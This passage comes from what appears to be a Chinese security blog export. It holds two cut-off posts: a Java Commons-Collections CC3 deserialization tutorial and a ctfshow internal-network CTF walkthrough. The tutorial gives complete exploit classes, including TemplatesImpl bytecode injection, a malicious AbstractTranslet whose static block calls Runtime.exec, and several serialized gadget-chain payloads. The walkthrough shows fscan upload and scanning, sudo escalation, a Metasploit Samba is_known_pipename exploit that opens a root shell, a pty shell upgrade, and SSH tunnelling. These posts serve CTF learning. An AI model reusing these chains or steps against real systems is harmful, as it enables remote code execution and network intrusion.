java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class CC3 {\n    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException, TransformerConfigurationException {\n        TemplatesImpl templates = new TemplatesImpl();\n        \n        //反射修改类的属性_name，_name不为null\n        setFieldValue(templates,\"_name\",\"a\");\n        \n        //给_bytecodes赋值为需要执行的字节码\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\CC1\\\\target\\\\classes\\\\CC3\\\\URLClassLoader_test.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n        \n        //反射修改类的属性_tfactory\n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n        templates.newTransformer();\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n}\n```\n\n我这里把重复的功能重新写个函数了，这样方便些\n\n但是运行后又出现新的报错\n\n```java\nException in thread \"main\" javax.xml.transform.TransformerConfigurationException: 无法加载 translet 类 'a'。\n\tat com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(Unknown Source)\n\tat com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(Unknown Source)\n\tat com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(Unknown Source)\n\tat CC3.CC3.main(CC3.java:33)\n```\n\n这里的话简单来说就是需要我们的**字节码必须是 `Translet` 子类**，我们的恶意类必须直接或间接继承**`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`**，那我们在里面调整一下\n\n![image-20250617172701659](../image/achieve/202411/java学习/image-20250617172701659.png)\n\n因为AbstractTranslet是抽象类，所以我们要实现它所有的抽象方法。\n\n```java\n    public abstract void transform(DOM document, DTMAxisIterator iterator,\n                                   SerializationHandler handler)\n        throws TransletException;\n```\n\n修改之后的恶意类\n\n```java\npackage CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\nimport java.io.IOException;\n\npublic class URLClassLoader_test extends AbstractTranslet {\n    static {\n        try {\n            Runtime.getRuntime().exec(\"calc\");\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n}\n```\n\n然后我们运行一下就可以出来了\n\n![image-20250618140700639](../image/achieve/202411/java学习/image-20250618140700639.png)\n\n## 链子分析衔接\n\n其实这个链子有两条路可以走，一个就是寻找如何触发newTransformer（EXP1），另一个就是直接调用newTransformer()方法（EXP2）\n\n然后我们接下来看看怎么触发**TemplatesImpl.newTransformer()**，查找一下用法\n\n### TrAXFilter#TrAXFilter()\n\n![image-20250618142844444](../image/achieve/202411/java学习/image-20250618142844444.png)\n\n找到了 TrAXFilter类的TrAXFilter方法\n\n```java\npublic TrAXFilter(Templates templates)  throws\n        TransformerConfigurationException\n    {\n        _templates = templates;\n        _transformer = (TransformerImpl) templates.newTransformer();\n        _transformerHandler = new TransformerHandlerImpl(_transformer);\n        _useServicesMechanism = _transformer.useServicesMechnism();\n    }\n```\n\n公开属性的构造方法，那我们如果实例化一个对象就能调用到这个构造方法，并且这里templates就是我们传入的参数\n\n```java\npackage CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\n\nimport javax.xml.transform.Templates;\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.io.IOException;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class CC3 {\n    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException, TransformerConfigurationException, NoSuchMethodException {\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates,\"_name\",\"a\");\n\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\CC1\\\\target\\\\classes\\\\CC3\\\\URLClassLoader_test.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n\n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n        new TrAXFilter(templates);\n\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n}\n```\n\n到这其实就分析的差不多了，但是我们此时链子尚不完整，需要找到能代替实例化TrAXFilter的方法，CC3的作者并没有使用CC1的InvokerTransformer的transform而是用了InstantiateTransformer::transform()。\n\n### InstantiateTransformer#transform()\n\n![image-20250618144222104](../image/achieve/202411/java学习/image-20250618144222104.png)\n\n完美契合我们的要求，这里可以获取构造器并调用构造函数，简直不要太爽\n\n我们看一下该类的构造函数\n\n```java\n    public InstantiateTransformer(Class[] paramTypes, Object[] args) {\n        super();\n        iParamTypes = paramTypes;\n        iArgs = args;\n    }\n```\n\n这里的话我们传入`new Class[]{Templates.class}` 与 `new Object[]{templates}` 就可以了\n\n然后我们来构造EXP\n\n```java\npackage CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\n\nimport javax.xml.transform.Templates;\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.io.IOException;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class CC3 {\n    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException, TransformerConfigurationException, NoSuchMethodException {\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates,\"_name\",\"a\");\n\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\CC1\\\\target\\\\classes\\\\CC3\\\\URLClassLoader_test.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n\n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});\n        instantiateTransformer.transform(TrAXFilter.class);\n\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n}\n```\n\n然后我们就可以找一下怎么触发transform方法了，这貌似可以跟CC1和CC6挂上关系\n\n## 0x05接入CC1\n\n从上面可以看到，我们此时链子尚不完整，还是需要回到最终的readObject中，这时候就需要接壤一下CC1的后半段了，也就是我们的\n\nChainedTransformer方法\n\n```java\npackage CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport javax.xml.transform.Templates;\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.io.*;\nimport java.lang.reflect.*;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC3 {\n    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException, TransformerConfigurationException, NoSuchMethodException, InvocationTargetException, InvocationTargetException {\n        TemplatesImpl templates = new TemplatesImpl();\n        \n        //给_name进行赋值\n        setFieldValue(templates,\"_name\",\"a\");\n        \n        //给_bytecodes赋值\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\CC1\\\\target\\\\classes\\\\CC3\\\\URLClassLoader_test.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n        \n        //反射修改类的属性_tfactory\n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n//        templates.newTransformer();\n\n        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});\n//        instantiateTransformer.transform(TrAXFilter.class);\n        \n        //LazyMap触发transform方法CC1后半段\n        HashMap<Object, Object> map = new HashMap<>();\n        Map decorateMap = LazyMap.decorate(map, instantiateTransformer);\n\n        Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor construct = c.getDeclaredConstructor(Class.class, Map.class);\n        construct.setAccessible(true);\n        InvocationHandler handler = (InvocationHandler) construct.newInstance(Override.class, decorateMap);\n        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);\n        Object o = (InvocationHandler) construct.newInstance(Override.class, proxyMap);\n        serialize(o);\n        unserialize(\"CC3.txt\");\n\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws IOException{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC3.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws IOException, ClassNotFoundException{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n```\n\n但是出现了一个报错\n\n```\nException in thread \"main\" org.apache.commons.collections.FunctorException: InstantiateTransformer: Input object was not an instanceof Class, it was a java.lang.String\n\tat org.apache.commons.collections.functors.InstantiateTransformer.transform(InstantiateTransformer.java:101)\n\tat org.apache.commons.collections.map.LazyMap.get(LazyMap.java:158)\n\tat sun.reflect.annotation.AnnotationInvocationHandler.invoke(Unknown Source)\n\tat com.sun.proxy.$Proxy1.entrySet(Unknown Source)\n\tat sun.reflect.annotation.AnnotationInvocationHandler.readObject(Unknown Source)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)\n```\n\n意思就是说InstantiateTransformer我们传入的是一个字符串而不是一个类对象，后面发现是CC1中的setValue()的问题，`setValue()` 的传参无法控制，需要引入 `Transformer` 与 `ChainedTransformer` 加以辅助。\n\n![image-20240417120528155](../image/achieve/202411/java学习/image-20240417120528155.png)\n\n### EXP1(instantiateTransformer#transform())\n\n```java\npackage POC.CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.transform.Templates;\nimport java.io.*;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC3 {\n    public static void main(String[] args) throws Exception {\n        TemplatesImpl templates = new TemplatesImpl();\n\n        //反射改变类的属性_name\n        setFieldValue(templates,\"_name\",\"a\");\n\n        //反射改变类的属性_bytecodes\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\CC1\\\\target\\\\classes\\\\POC\\\\CC3\\\\POC.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n\n        //反射改变类的属性_tfactoury\n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n//        templates.newTransformer();\n\n//        instantiateTransformer.transform(TrAXFilter.class);\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n        //Map类的构建和修饰\n        HashMap<Object, Object> map = new HashMap<>();\n        map.put(\"value\",\"aaa\");\n        Map<Object,Object> transformermap = TransformedMap.decorate(map,null,chainedTransformer);\n\n        //遍历Map，触发链子\n        Class A = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor constructor = A.getDeclaredConstructor(Class.class, Map.class);\n        constructor.setAccessible(true);\n        Object o = constructor.newInstance(Target.class,transformermap);\n        serialize(o);\n        unserialize(\"CC3.txt\");\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC3.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws IOException, ClassNotFoundException{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n```\n\n![image-20250618150445230](../image/achieve/202411/java学习/image-20250618150445230.png)\n\n![image-20250628194332903](../image/achieve/202411/java学习/image-20250628194332903.png)\n\n这个链子的话是通过触发instantiateTransformer.transform()方法来的，当然也可以不用这个transform()而用IvokerTransform去直接触发\n\n### EXP2（直接触发newTransformer）\n\n```java\npackage POC.CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.*;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC3 {\n    public static void main(String[] args) throws Exception {\n        TemplatesImpl templates = new TemplatesImpl();\n\n        //反射改变类的属性_name\n        setFieldValue(templates,\"_name\",\"a\");\n\n        //反射改变类的属性_bytecodes\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\CC1\\\\target\\\\classes\\\\POC\\\\CC3\\\\POC.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n\n        //反射改变类的属性_tfactoury\n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n//        templates.newTransformer();\n        \n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(templates),\n                new InvokerTransformer(\"newTransformer\",null,null)\n        };\n        ChainedTransformer chainedTransformer =  new ChainedTransformer(transformers);\n\n        //Map类的构建与修饰\n        HashMap<Object,Object> map = new HashMap<>();\n        map.put(\"value\",\"aaa\");\n        Map outmap = TransformedMap.decorate(map,null,chainedTransformer);\n\n        //遍历map，触发链子\n        Class handler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor constructorhandler = handler.getDeclaredConstructor(Class.class, Map.class);\n        constructorhandler.setAccessible(true);\n        Object obj = constructorhandler.newInstance(Target.class,outmap);\n        serialize(obj);\n        unserialize(\"CC3.txt\");\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC3.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws IOException, ClassNotFoundException{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n```\n\n![image-20250628194351866](../image/achieve/202411/java学习/image-20250628194351866.png)\n\n## 0x06接入CC6\n\n### 接入CC6的EXP2\n\n```java\npackage CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport javax.xml.transform.Templates;\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.io.*;\nimport java.lang.reflect.*;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC3 {\n    public static void main(String[] args) throws Exception {\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates,\"_name\",\"a\");\n\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\CC1\\\\target\\\\classes\\\\CC3\\\\URLClassLoader_test.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n\n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n//        templates.newTransformer();\n\n        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});\n//        instantiateTransformer.transform(TrAXFilter.class);\n        Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                instantiateTransformer\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        Map<Object,Object> lazyMap = LazyMap.decorate(new HashMap<>(),new ConstantTransformer(\"1\"));\n\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"2\");\n        HashMap<Object,Object> hashmap = new HashMap<>();\n        hashmap.put(tiedMapEntry, \"3\");\n        lazyMap.remove(\"2\");\n\n        //反射修改值\n        Class<LazyMap> lazyMapClass = LazyMap.class;\n        Field factory = lazyMapClass.getDeclaredField(\"factory\");\n        factory.setAccessible(true);\n        factory.set(lazyMap, chainedTransformer);\n\n        serialize(hashmap);\n        unserialize(\"CC3.txt\");\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws IOException{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC3.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws IOException, ClassNotFoundException{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n```\n\n![image-20250618150704133](../image/achieve/202411/java学习/image-20250618150704133.png)\n\n## 小结\n\n到此为止已经分析完了CC1，CC3，CC6，不过不得不说CC3是一种绕过Runtime的好办法\n\n贴一张链子总结的图https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/ALLCC.png\n\n![img](../image/achieve/202411/java学习/ALLCC.png)\n\n\n\n","tags":["java反序列化"],"categories":["javasec"]},{"title":"ctfshow入门内网渗透","url":"/2025/06/15/ctfshow入门内网渗透/","content":"\n## web859_有跳板机\n\n开启环境后用ssh连接一下\n\n攻击机**不出网**，但是给了工具\n\n问题是怎么扫内网ip呢？后面发现可以利用ssh传输fscan\n\n```\nscp -P 28242 fscan ctfshow@pwn.challenge.ctf.show:/tmp\n```\n\n传上去了，那我们扫一下内网\n\n```\n$ whoami\nctfshow\n$ ifconfig\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1450\n        inet 172.2.237.4  netmask 255.255.255.0  broadcast 172.2.237.255\n        ether 02:42:ac:02:ed:04  txqueuelen 0  (Ethernet)\n        RX packets 119  bytes 12212 (12.2 KB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 83  bytes 11563 (11.5 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 0  bytes 0 (0.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 0  bytes 0 (0.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n```\n\n但是这里权限太低了，看看能不能提权，本来以为需要查找sudo -l去提权的，结果只需要sudo su就行了，那么就来到了root权限\n\n![image-20250615201837630](../image/achieve/202411/内网渗透/image-20250615201837630.png)\n\n给fscan权限\n\n```\nchmod +x *\n```\n\n然后开始扫内网\n\n```c#\nroot@shell:/tmp# ./fscan -h 172.2.203.0/24\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n(icmp) Target 172.2.203.4     is alive\n(icmp) Target 172.2.203.1     is alive\n(icmp) Target 172.2.203.5     is alive\n(icmp) Target 172.2.203.6     is alive\n(icmp) Target 172.2.203.7     is alive\n(icmp) Target 172.2.203.2     is alive\n(icmp) Target 172.2.203.3     is alive\n[*] Icmp alive hosts len is: 7\n172.2.203.6:445 open\n172.2.203.4:22 open\n172.2.203.6:139 open\n172.2.203.5:9000 open\n172.2.203.5:80 open\n[*] alive ports len is: 5\nstart vulscan\n[+] FCGI 172.2.203.5:9000 \nStatus: 403 Forbidden\nX-Powered-By: PHP/7.3.22\nContent-type: text/html; charset=UTF-8\n\nAccess denied.\nstderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions)\nplesa try other path,as -path /www/wwwroot/index.php\n[*] OsInfo 172.2.203.6  (Windows 6.1)\n[*] NetBios 172.2.203.6     oa                                  Windows 6.1\n[*] WebTitle http://172.2.203.5        code:200 len:2880   title:欢迎登陆CTFshow文件管理系统\n[+] PocScan http://172.2.203.5 poc-yaml-php-cgi-cve-2012-1823 \n```\n\n看到172.2.203.6开放了445端口，猜测有Samba服务，用msf中的辅助模块**`auxiliary/scanner/smb/smb_version`**检测一下Samba的版本以及是否存在漏洞\n\n```\nmsf6 > use auxiliary/scanner/smb/smb_version\nmsf6 auxiliary(scanner/smb/smb_version) > show options\n\nModule options (auxiliary/scanner/smb/smb_version):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com\n                                       /docs/using-metasploit/basics/using-metasploit.html\n   THREADS  1                yes       The number of concurrent threads (max one per host)\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 auxiliary(scanner/smb/smb_version) > set rhosts 172.2.237.6\nrhosts => 172.2.237.6\nmsf6 auxiliary(scanner/smb/smb_version) > run\n\n[*] 172.2.237.6:445       - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{0000616f-0000-0000-0000-000000000000}) (authentication domain:OA)\n[*] 172.2.237.6:445       -   Host could not be identified: Windows 6.1 (Samba 4.6.3)\n[*] 172.2.237.6:          - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\n可以看到这里有用到旧协议，我们可以试着打一下\n\n```\nmsf6 exploit(linux/samba/is_known_pipename) > use exploit/linux/samba/is_known_pipename\n[*] Using configured payload cmd/unix/interact\nmsf6 exploit(linux/samba/is_known_pipename) > show options \n\nModule options (exploit/linux/samba/is_known_pipename):\n\n   Name            Current Setting  Required  Description\n   ----            ---------------  --------  -----------\n   RHOSTS                           yes       The target host(s), see https://docs.metaspl\n                                              oit.com/docs/using-metasploit/basics/using-m\n                                              etasploit.html\n   RPORT           445              yes       The SMB service port (TCP)\n   SMB_FOLDER                       no        The directory to use within the writeable SM\n                                              B share\n   SMB_SHARE_NAME                   no        The name of the SMB share containing a write\n                                              able directory\n\n\nPayload options (cmd/unix/interact):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic (Interact)\n\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 exploit(linux/samba/is_known_pipename) > set rhosts 172.2.237.6\nrhosts => 172.2.237.6\nmsf6 exploit(linux/samba/is_known_pipename) > run\n\n[*] 172.2.237.6:445 - Using location \\\\172.2.237.6\\myshare\\ for the path\n[*] 172.2.237.6:445 - Retrieving the remote path of the share 'myshare'\n[*] 172.2.237.6:445 - Share 'myshare' has server-side path '/home/share\n[*] 172.2.237.6:445 - Uploaded payload to \\\\172.2.237.6\\myshare\\ZdrCXlDR.so\n[*] 172.2.237.6:445 - Loading the payload from server-side path /home/share/ZdrCXlDR.so using \\\\PIPE\\/home/share/ZdrCXlDR.so...\n[-] 172.2.237.6:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND\n[*] 172.2.237.6:445 - Loading the payload from server-side path /home/share/ZdrCXlDR.so using /home/share/ZdrCXlDR.so...\n[+] 172.2.237.6:445 - Probe response indicates the interactive payload was loaded...\n[*] Found shell.\n[*] Command shell session 1 opened (172.2.237.4:45913 -> 172.2.237.6:445) at 2025-06-15 20:40:50 +0800\n\nls\nwhoami\nroot\n```\n\n出来了，我以为打不通来着，那我们换成bash的shell\n\n```python\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\nroot@oa:/tmp# cd /\ncd /\nroot@oa:/# ls\nls\nbin   dev  home  lib64  mnt  proc  run   srv  tmp  var\nboot  etc  lib   media  opt  root  sbin  sys  usr\nroot@oa:/# cd /toor\ncd /toor\nbash: cd: /toor: No such file or directory\nroot@oa:/# cd /root\ncd /root\nroot@oa:/root# ls\nls\nflag.txt\nroot@oa:/root# cat flag.txt\ncat flag.txt\nctfshow{e7899cb3-53b6-4e01-b8c8-5b4cf7e88368}\nroot@oa:/root# \n```\n\n成功拿到flag\n\n这里的话也可以发现172.2.203.5开放了80端口，但是靶机不出网，需要进行内网穿透，我们可以搭建ssh隧道\n\n```\nssh -L (本地端口):(目标主机ip):(目标主机端口) (跳板机用户名)@(跳板机ip) -p (跳板机端口)\nssh -L 8085:172.2.68.5:80 ctfshow@pwn.challenge.ctf.show -p 28245\n```\n\n然后访问`http://127.0.0.1:8085/`就可以出来了\n\n![image-20250615212138558](../image/achieve/202411/内网渗透/image-20250615212138558.png)\n\n刚刚fscan扫出来一个cve-2012-1823，可以参考P牛的文章：https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html\n\n在页面右下角的**CTFshow文件管理系统**发现源码泄露，我们下载下来分析一下\n\n```php\n/api/index.php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2023-02-22 09:15:26\n# @Last Modified by:   h1xa\n# @Last Modified time: 2023-02-22 11:07:47\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nerror_reporting(0);\nsession_start();\n\nclass action{\n\n\tprivate $username;\n\tprivate $password;\n\tprivate $email;\n\n\tpublic function doAction(){\n\t\t\n\t\t$action = $_GET['a'] ?? \"login\";\n\n\t\tswitch ($action) {\n\t\t\tcase 'login':\n\t\t\t\t$this->doLogin();\n\t\t\t\tbreak;\n\t\t\tcase 'reset':\n\t\t\t\t$this->doReset();\n\t\t\t\tbreak;\n\t\t\tcase 'view':\n\t\t\t\t$this->doView();\n\t\t\t\tbreak;\t\n\t\t\tdefault:\n\t\t\t\t$this->doDefault();\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\n\tfunction doLogin(){\n\n\t\tinclude 'config.php';\n\t\t$username = $this->doFilter($_POST['username']);\n\t\t$password = $this->doFilter($_POST['password']);\n\t\t$conn = new 